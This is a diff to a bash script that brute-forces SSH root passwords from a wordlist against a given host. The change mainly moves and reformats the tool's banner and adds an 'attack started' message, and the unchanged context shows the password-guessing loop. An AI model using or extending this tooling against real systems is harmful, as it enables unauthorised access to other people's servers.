@@ -16,18 +16,6 @@ function test_ssh_password {
     fi
 }
 
-echo "   ____ ____ _   _    _    ____ _   _   "
-echo "  |___ |___ | | | |  / \  |___ | | | |  "
-echo "  / ___/ ___| |_| | / _ \ / ___| |_| |  "
-echo " | (__| (___|  _  |/ ___ | (___|  _  |  "
-echo "  \____\____|_| |_/_/   \_\____|_| |_|  "
-echo "                              TRABBIT   "
-echo "======================================= "
-echo "--{[+]TARGET} // \$host_url || \$host_ip"
-echo "--{[+]PORT} // \$ssh_port"
-echo "--{[+]PASSLIST} // \$passwordlist_path"
-echo ""
-
 # Parse command-line arguments
 while getopts ":i:u:p:l:" opt; do
     case $opt in
@@ -55,6 +43,24 @@ fi
 
 IFS=$'\r\n' GLOBIGNORE='*' command eval 'passwords=($(cat "$passwordlist_path"))'
 
+echo "   ____ ____ _   _    _    ____ _   _   "
+echo "  |___ |___ | | | |  / \  |___ | | | |  "
+echo "  / ___/ ___| |_| | / _ \ / ___| |_| |  "
+echo " | (__| (___|  _  |/ ___ | (___|  _  |  "
+echo "  \____\____|_| |_/_/   \_\____|_| |_|  "
+echo "                              TRABBIT   "
+echo "======================================="
+
+# Display target, port, and passlist
+echo "--{[+]TARGET} // ${host_url}"
+echo "--{[+]PORT} //  ${ssh_port:-22}"
+echo "--{[+]PASSLIST} // ${passwordlist_path:-}"
+
+echo "======================================="
+echo "//BRUTEFORCE ATTACK STARTED//           "
+echo "======================================="
+echo ""
+
 for password in "${passwords[@]}"; do
     if [[ -n $host_ip ]]; then
         test_ssh_password "root" "$ssh_port" "$password" "$host_ip"
@@ -62,4 +68,3 @@ for password in "${passwords[@]}"; do
         test_ssh_password "root" "$ssh_port" "$password" "$host_url"
     fi
 done
-
